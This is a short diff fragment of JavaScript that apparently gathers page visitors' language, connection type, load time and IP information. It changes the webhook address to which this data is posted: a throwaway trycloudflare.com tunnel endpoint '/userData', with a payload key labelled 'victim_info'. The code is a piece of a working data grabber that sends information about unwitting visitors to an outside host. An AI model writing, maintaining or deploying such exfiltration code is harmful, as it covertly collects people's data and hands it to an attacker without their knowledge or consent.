@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://trinity-eat-sie-elizabeth.trycloudflare.com/userData";
+                const webhookURL = "https://due-procedure-brunei-loans.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
